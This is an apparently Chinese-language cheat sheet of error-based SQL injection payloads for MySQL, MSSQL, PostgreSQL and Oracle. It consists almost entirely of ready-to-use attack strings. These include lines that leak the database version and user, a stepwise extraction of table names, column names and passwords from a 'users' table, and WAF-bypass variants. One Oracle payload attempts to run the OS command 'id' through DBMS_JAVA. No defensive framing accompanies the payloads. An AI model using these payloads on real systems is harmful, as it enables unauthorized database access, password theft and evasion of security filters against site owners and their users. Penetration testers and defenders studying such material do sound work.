# 报错注入 (Error-based SQL Injection)

## 1. MySQL报错注入

### extractvalue

```sql
' AND extractvalue(1,concat(0x7e,version()))--
' AND extractvalue(1,concat(0x7e,database()))--
' AND extractvalue(1,concat(0x7e,user()))--
```

### updatexml

```sql
' AND updatexml(1,concat(0x7e,version()),1)--
' AND updatexml(1,concat(0x7e,(SELECT database())),1)--
```

### floor+rand

```sql
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

### exp

```sql
' AND EXP(~(SELECT * FROM (SELECT version())a))--
```

---

## 2. MSSQL报错注入

```sql
' AND 1=1/@@version--
' AND 'a'+'b'='ab' AND 1/0--
```

---

## 3. PostgreSQL报错注入

```sql
' AND cast(1 as text)||cast(version() as text)--
' AND 1::text||version()--
```

---

## 4. Oracle报错注入

```sql
' AND CTXSYS.DRITHSX.SN(user,(SELECT version FROM dual))--
' AND (SELECT DBMS_JAVA.RUNJAVA('java.lang.Runtime.exec(''id'')') FROM dual)--
```

---

## 5. 提取数据

### 获取表名

```sql
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))--
```

### 获取列名

```sql
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users')))--
```

### 获取数据

```sql
' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 0,1)))--
```

---

## 6. 绕过WAF

### 编码绕过

```sql
' AND extractvalue(1,concat(0x7e,(SELECT unhex(hex(database()))))--
```

### 函数变形

```sql
' AND GEOMETRYCOLLECTION((SELECT * FROM (SELECT * FROM (SELECT version())a)b))--
' AND (SELECT 1 FROM (SELECT NTILE(1) OVER(ORDER BY (SELECT version())))a)--
```
